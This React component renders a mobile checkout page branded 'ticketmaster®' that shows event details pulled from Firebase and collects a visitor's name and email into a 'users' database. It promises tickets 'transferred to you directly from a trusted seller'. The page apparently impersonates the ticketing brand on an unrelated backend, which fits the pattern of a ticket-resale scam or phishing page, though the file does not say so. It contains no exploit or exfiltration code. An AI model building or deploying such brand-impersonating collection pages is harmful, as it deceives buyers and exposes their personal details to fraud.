import React, { useEffect, useState } from 'react';
import { ref, onValue, push } from 'firebase/database';
import { db } from '../../firebase'; // Adjust path as necessary

const HeaderCheckout = () => {
    const [scrolled, setScrolled] = useState(false);
    const [data, setData] = useState({ heading1: '', heading2: '', heading3: '', body2: '' });
    const [name, setName] = useState('');
    const [email, setEmail] = useState('');
    const [submitted, setSubmitted] = useState(false);

    useEffect(() => {
        const handleScroll = () => {
            setScrolled(window.scrollY > 50);
        };

        window.addEventListener('scroll', handleScroll);
        return () => window.removeEventListener('scroll', handleScroll);
    }, []);

    // Fetch data from Firebase
    useEffect(() => {
        const dataRef = ref(db, 'uploads/latest');
        onValue(dataRef, (snapshot) => {
            const value = snapshot.val();
            if (value) {
                setData({
                    heading1: value.heading1 || '',
                    heading2: value.heading2 || '',
                    heading3: value.heading3 || '',
                    body2: value.body2 || '',
                });
            }
        });

        // Load form submission status
        const storedData = localStorage.getItem('checkoutDetails');
        if (storedData) {
            const { name, email } = JSON.parse(storedData);
            setName(name);
            setEmail(email);
            setSubmitted(true);
        }
    }, []);

    const handleSubmit = () => {
        if (!name || !email) {
            alert('Please fill in both fields.');
            return;
        }

        const userRef = ref(db, 'users');
        push(userRef, { name, email })
            .then(() => {
                alert('Details submitted successfully!');
                localStorage.setItem('checkoutDetails', JSON.stringify({ name, email }));
                setSubmitted(true);
            })
            .catch((error) => {
                alert('Error submitting details: ' + error.message);
            });
    };

    return (
        <div className="block sm:hidden bg-gray-100">
            <div className="fixed top-0 w-full flex justify-center z-50 border-t-[2px] bg-black text-white" style={{ borderTopColor: '#034ddc' }}>
                <div className={`w-full max-w-md transition-all duration-300 ease-in-out ${scrolled ? 'py-2 px-2' : 'p-3'}`}>
                    {!scrolled ? (
                        <div className="text-sm italic text-gray-300">ticketmaster®</div>
                    ) : (
                        <div className="text-3xl italic font-bold text-white">t</div>
                    )}
                </div>
            </div>

            <div className="flex justify-center pt-20 sm:pt-0">
                <div className="w-full max-w-md bg-black text-white -mt-9 relative overflow-hidden sm:hidden">
                    <div className="absolute top-0 right-0 w-28 h-16 bg-[repeating-linear-gradient(-45deg,_#444_0,_#444_2px,_transparent_2px,_transparent_4px)] pointer-events-none z-10"></div>
                    <div className="absolute top-40 left-0 w-full h-full bg-white z-0"></div>

                    <div className="p-4 relative z-20">
                        <div className="text-xl font-bold border-b-4 border-blue-600 w-fit">CHECKOUT</div>
                    </div>

                    {/* Event Info Card */}
                    <div className="relative z-10 mx-4 mt-4 p-4 bg-white text-black rounded shadow-md">
                        <h2 className="font-bold">{data.heading1}</h2>
                        <p className="text-sm text-gray-700">{data.heading2}</p>
                        <p className="text-sm text-gray-700">{data.heading3}</p>
                        <p className="text-sm text-gray-700">
                            {data.body2}{' '}
                            <a className="text-blue-600 underline ml-1" href="#">View Seats</a>
                        </p>
                    </div>

                    {/* Delivery Info Card */}
                    <div className="relative z-10 mx-4 mt-11 mb-6 p-4 bg-white text-black rounded shadow-md">
                        <h3 className="font-bold mb-4">DELIVERY</h3>

                        <div className="flex justify-between items-center mt-2 mb-2">
                            <span className="text-sm">Mobile</span>
                            <span className="text-sm font-semibold">FREE</span>
                        </div>

                        <p className="text-sm text-gray-700 mb-3">
                            These mobile tickets will be transferred to you directly from a trusted seller. You'll receive an email with instructions on how to accept them on the original ticket provider's mobile app. Please provide details needed for the transfer.
                        </p>

                        <div className="mb-4">
                            <label htmlFor="name" className="block text-sm font-medium mb-1">Name</label>
                            <input
                                type="text"
                                id="name"
                                name="name"
                                value={name}
                                onChange={(e) => setName(e.target.value)}
                                className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                                placeholder="Enter your full name"
                                disabled={submitted}
                            />
                        </div>

                        <div className="mb-4">
                            <label htmlFor="email" className="block text-sm font-medium mb-1">Email Address</label>
                            <input
                                type="email"
                                id="email"
                                name="email"
                                value={email}
                                onChange={(e) => setEmail(e.target.value)}
                                className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                                placeholder="Enter your email address"
                                disabled={submitted}
                            />
                        </div>

                        {!submitted && (
                            <button
                                onClick={handleSubmit}
                                className="w-full bg-blue-600 text-white py-2 px-4 rounded hover:bg-blue-700 transition duration-300"
                            >
                                Submit
                            </button>
                        )}
                        {submitted && (
                            <p className="text-sm text-green-600 text-center">Details already submitted ✅</p>
                        )}
                    </div>
                </div>
            </div>
        </div>
    );
};

export default HeaderCheckout;
